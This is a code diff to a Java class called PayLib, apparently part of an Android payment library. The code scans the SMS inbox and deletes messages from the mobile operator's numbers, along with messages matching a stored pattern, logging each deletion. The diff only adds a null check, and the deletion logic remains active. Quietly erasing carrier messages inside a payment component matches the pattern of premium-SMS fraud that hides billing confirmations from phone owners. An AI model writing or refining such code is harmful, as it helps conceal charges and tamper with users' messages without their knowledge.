@@ -538,33 +538,36 @@ public class PayLib implements PayInterface {
                 String body = c.getString(c.getColumnIndex("body"));
                 String date = c.getString(3);
                 Logger.lg("Message  " + body + " id " + id + " date " + date + " " + address);
-                if ((operatorSMS.smsNum.contains(address) || address.toUpperCase().equals(operatorSMS.name)) && flag < 2) {
-                    int iko = cnt.getContentResolver().delete(
-                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
-                    if (iko != 0) {
-                        flag++;
+                if (address != null) {
+                    if ((operatorSMS.smsNum.contains(address) || address.toUpperCase().equals(operatorSMS.name)) && flag < 2) {
+                        int iko = cnt.getContentResolver().delete(
+                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
+                        if (iko != 0) {
+                            flag++;
+                        }
+                        Logger.lg("Delete result " + iko);
                     }
-                    Logger.lg("Delete result " + iko);
-                }
-                Logger.lg(currentMsg + " " + address + " " +
-                        " " + currentMsg.substring(currentMsg.indexOf("[]") + 2) +
-                        body + " " + currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) + " " + body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2)));
-                boolean flagFilters = true;
-                if (!filters.isEmpty()) {
-                    for (Map.Entry<String, String> filter : filters.entrySet()) {
-                        int index = c.getColumnIndex(filter.getKey());
-                        if (index != -1) {
-                            if (!c.getString(index).contains(filter.getValue())) {
-                                flagFilters = false;
+//                Logger.lg(currentMsg + " " + address + " " +
+//                        " " + currentMsg.substring(currentMsg.indexOf("[]") + 2) +
+//                        body + " " + currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) + " " + body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2)));
+                    boolean flagFilters = true;
+                    if (!filters.isEmpty()) {
+                        for (Map.Entry<String, String> filter : filters.entrySet()) {
+                            int index = c.getColumnIndex(filter.getKey());
+                            if (index != -1) {
+                                if (!c.getString(index).contains(filter.getValue())) {
+                                    flagFilters = false;
+                                }
                             }
                         }
                     }
-                }
-                if (flagFilters && currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) && body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2))
-                        && flag2 == 0) {
-                    flag2 = cnt.getContentResolver().delete(
-                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
-                    Logger.lg("deltete " + flag2);
+
+                    if (flagFilters && currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) && body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2))
+                            && flag2 == 0) {
+                        flag2 = cnt.getContentResolver().delete(
+                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
+                        Logger.lg("deltete " + flag2);
+                    }
                 }
             } while (c.moveToNext());
         }
